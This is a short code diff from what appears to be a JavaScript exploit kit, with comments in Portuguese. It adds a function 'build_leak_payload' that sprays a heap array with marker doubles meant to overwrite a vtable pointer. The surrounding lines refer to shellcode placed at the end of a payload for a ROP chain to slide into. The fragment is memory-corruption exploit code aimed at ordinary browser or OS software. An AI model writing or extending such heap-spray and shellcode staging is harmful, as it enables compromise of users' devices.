@@ -30,7 +30,24 @@ export function build_history_payload(size) {
             offset += 8;
         }
     }
-
+// Constrói um Array Nativo (Butterfly Heap)
+export function build_leak_payload(sizeInBytes) {
+    // 0xA0 (160 bytes) / 8 bytes por Double = 20 elementos
+    const elementCount = Math.floor(sizeInBytes / 8);
+    
+    const arr = new Array(elementCount);
+    
+    // Valor Marcador: 1.1 (0x3FF199999999999A)
+    // Se este valor sobrescrever um ponteiro vtable, o sistema vai tentar ler
+    // memória em 0x3FF1... (Userland). Isso gera um erro seguro ou um valor legível.
+    // Se usássemos 0x4141... poderia dar Panic imediato.
+    
+    for(let i=0; i<arr.length; i++) {
+        arr[i] = 1.1; 
+    }
+    
+    return arr;
+}
     // 2. SHELLCODE NO FINAL
     // Convertemos o shellcode para Uint32 e colocamos no fim
     // Se o ROP funcionar, ele desliza até aqui.
